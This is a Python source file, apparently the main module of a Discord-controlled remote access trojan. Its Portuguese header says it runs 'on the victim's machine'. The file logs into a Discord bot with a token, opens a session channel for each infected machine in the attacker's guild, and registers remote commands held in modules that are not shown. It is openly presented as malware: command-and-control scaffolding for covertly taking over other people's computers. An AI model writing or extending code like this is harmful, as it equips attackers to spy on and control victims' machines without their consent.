# Arquivo Principal - Executado na máquina da vítima
# Início: 30/04/2025 | Última atualização: 01/05/2025

from discord.ext import commands
import discord
import traceback

from config import TOKEN, GUILD_ID, SESSION_PREFIX
from utils.session_manager import create_session
from utils.error_handler import setup_error_handlers
from commands.command_handler import register_commands

# Intents e Client
intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix='!', intents=intents)

client.session_info = {
    "channel_id": None,
    "start_time": None
}

@client.event
async def on_ready():
    print(f"[+] Connected as {client.user}")
    
    try:
        channel = await create_session(client, GUILD_ID, SESSION_PREFIX)
        if not channel:
            print("[!] Falha ao criar sessão")
            return
            
        status = discord.Game("Made by Apophenia, Ace")
        await client.change_presence(status=discord.Status.online, activity=status)
        
    except Exception as e:
        print(f"[!] Erro no evento on_ready: {str(e)}")
        traceback.print_exc()

setup_error_handlers(client)

register_commands(client)

if __name__ == "__main__":
    try:
        client.run(TOKEN)
    except discord.LoginFailure:
        print("[!] Erro: Token inválido")
    except discord.HTTPException as e:
        print(f"[!] Erro HTTP: {e}")
    except Exception as e:
        print(f"[!] Erro ao iniciar o bot: {str(e)}")
        traceback.print_exc()